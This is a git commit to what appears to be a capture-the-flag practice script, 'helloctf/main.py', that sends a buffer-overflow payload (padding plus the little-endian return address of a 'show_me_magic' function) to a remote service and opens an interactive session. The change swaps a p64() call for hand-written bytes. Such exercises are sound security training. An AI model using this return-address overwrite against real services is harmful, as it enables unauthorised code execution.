3fc23005c57f804a99582cd770176345813d7cf0
wuling31715 <wuling31715@gmail.com>
2020-04-12 14:19:17 +0800

    .

--- adl/helloctf/main.py
+++ adl/helloctf/main.py
@@ -10,7 +10,9 @@ r = remote(ip, port)
 show_me_magic = 0x0000000000400627
 
 payload = "aaaabaaacaaadaaaeaaafaaa"
-payload += p64(show_me_magic)
+# payload += p64(show_me_magic)
+# little endian:
+payload += "\x27\x06\x40\x00\x00\x00\x00\x00"
 
 r.sendline(payload)
 r.interactive()
